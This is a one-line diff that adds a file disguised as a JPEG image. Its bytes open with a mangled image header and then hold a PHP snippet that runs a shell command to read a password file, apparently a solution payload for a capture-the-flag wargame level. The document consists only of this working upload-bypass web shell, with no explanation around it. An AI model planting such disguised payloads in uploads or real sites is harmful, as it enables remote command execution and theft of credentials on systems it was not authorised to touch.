@@ -1,0 +1,1 @@
+ÿØÿà¿½ï¿½ï¿½Ã¿Ã  <? system("cat /etc/natas_webpass/natas14"); ?>
